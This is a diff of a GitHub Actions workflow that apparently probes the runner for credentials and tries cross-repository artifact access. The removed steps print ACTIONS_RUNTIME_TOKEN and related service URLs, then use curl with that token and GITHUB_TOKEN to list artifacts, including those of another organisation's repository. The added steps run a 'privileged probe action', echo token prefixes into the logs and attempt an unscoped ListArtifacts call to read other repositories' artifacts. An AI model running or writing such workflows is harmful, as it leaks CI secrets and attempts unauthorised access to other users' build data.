@@ -4,56 +4,45 @@ jobs:
   upload:
     runs-on: ubuntu-latest
     steps:
-      - name: Upload artifact to populate env vars
-        uses: actions/upload-artifact@v4
-        with:
-          name: probe-artifact-2
-          path: /etc/hostname
-      
-      - name: Extract env vars via Node.js (may have different env from bash)
-        run: |
-          node -e "
-          const env = process.env;
-          const keys = ['ACTIONS_RESULTS_URL','ACTIONS_RUNTIME_TOKEN','ACTIONS_CACHE_URL','ACTIONS_ID_TOKEN_REQUEST_URL'];
-          keys.forEach(k => {
-            const v = env[k];
-            if (v) console.log(k + ': ' + v.substring(0, 80));
-            else console.log(k + ': (empty)');
-          });
-          // Also print any env vars with 'action' in the key
-          Object.keys(env).filter(k => k.toLowerCase().includes('action')).forEach(k => {
-            const v = env[k];
-            if (v && !v.includes('***')) console.log('FOUND: ' + k + '=' + v.substring(0,80));
-          });
-          "
+      - name: Checkout repo (needed for local action)
+        uses: actions/checkout@v4
 
-      - name: Probe artifact service if URL found
+      - name: Run privileged probe action (proper node action env)
+        id: probe
+        uses: ./probe-action
+
+      - name: Show outputs from probe action
         run: |
-          # Try known artifact service URLs directly with the runtime token
-          # Even if ACTIONS_RESULTS_URL is not in env, try known patterns
+          echo "=== Results from privileged node action ==="
+          echo "RESULTS_URL: ${{ steps.probe.outputs.RESULTS_URL }}"
+          echo "CACHE_URL: ${{ steps.probe.outputs.CACHE_URL }}"
+          echo "TOKEN_PRESENT: ${{ steps.probe.outputs.TOKEN_PRESENT }}"
+          echo "TOKEN_PREFIX: ${{ steps.probe.outputs.TOKEN_PREFIX }}"
           
-          # Pattern 1: pipelines.actions.githubusercontent.com
-          echo "=== Probe pipelines service ==="
-          curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
-            -H "Accept: application/json;api-version=6.0-preview" \
-            "https://pipelines.actions.githubusercontent.com/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
-            -d '{}' -w "\nHTTP: %{http_code}" 2>/dev/null | tail -5
+      - name: If token present, probe artifact service for cross-repo listing
+        run: |
+          RESULTS_URL="${{ steps.probe.outputs.RESULTS_URL }}"
+          TOKEN_PREFIX="${{ steps.probe.outputs.TOKEN_PREFIX }}"
           
-          # Pattern 2: results-receiver.actions.githubusercontent.com
-          echo "=== Probe results-receiver ==="
-          curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
-            -H "Content-Type: application/json" \
-            "https://results-receiver.actions.githubusercontent.com/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
-            -d '{}' -w "\nHTTP: %{http_code}" 2>/dev/null | tail -5
-          
-          # Pattern 3: Try via GITHUB_API_URL with workflow token 
-          echo "=== Probe GitHub API with workflow token (should be limited to this repo) ==="
-          curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
-            "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/artifacts" \
-            -w "\nHTTP: %{http_code}" 2>/dev/null | head -20
-          
-          # Pattern 4: Try cross-repo artifact access with the GITHUB_TOKEN
-          echo "=== Cross-repo artifact probe with GITHUB_TOKEN ==="
-          curl -s -H "Authorization: Bearer $GITHUB_TOKEN" \
-            "https://api.github.com/repos/github/docs/actions/artifacts" \
-            -w "\nHTTP: %{http_code}" 2>/dev/null | tail -5
+          if [ -n "$RESULTS_URL" ]; then
+            echo "=== RESULTS_URL found: $RESULTS_URL ==="
+            echo "=== Probing ListArtifacts without repo scope ==="
+            # Try to list artifacts - if not repo-scoped, this could return other repos' artifacts
+            curl -s -X POST \
+              -H "Authorization: Bearer $RUNTIME_TOKEN" \
+              -H "Content-Type: application/json" \
+              "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
+              -d '{}' -w "\nHTTP: %{http_code}" | tail -20
+          else
+            echo "RESULTS_URL was not found in node action env - testing ORCHESTRATION_ID path"
+            # Try using orchestration ID from env
+            echo "ACTIONS_ORCHESTRATION_ID: $ACTIONS_ORCHESTRATION_ID"
+            ORG_ID=$(echo "$ACTIONS_ORCHESTRATION_ID" | cut -d'.' -f1)
+            echo "Extracted UUID: $ORG_ID"
+            # Probe results-receiver with orchestration ID
+            curl -s -X POST \
+              -H "Content-Type: application/json" \
+              "https://results-receiver.actions.githubusercontent.com/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
+              -d "{\"workflowRunId\":\"$ORG_ID\"}" \
+              -w "\nHTTP: %{http_code}" | tail -10
+          fi
